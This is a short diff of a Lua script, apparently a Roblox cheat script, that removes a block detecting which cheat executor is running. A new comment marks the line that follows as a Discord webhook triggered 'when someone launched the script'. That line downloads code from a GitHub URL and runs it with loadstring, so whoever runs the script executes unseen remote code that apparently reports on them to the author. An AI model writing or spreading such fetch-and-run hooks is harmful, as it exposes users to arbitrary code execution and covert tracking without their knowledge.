@@ -19,14 +19,7 @@
 --]]
 
 
-local webhookcheck =
-  is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-  secure_load and "Sentinel" or
-  KRNL_LOADED and "Krnl" or
-  SONA_LOADED and "Sona" or
-  "Kid with shit exploit"
-
-
+-- discord webhook ( when someone launched the script )
 loadstring(game:HttpGet"https://raw.githubusercontent.com/discordxj2shn0001/aid/main/discord%20webhook")()
 
 
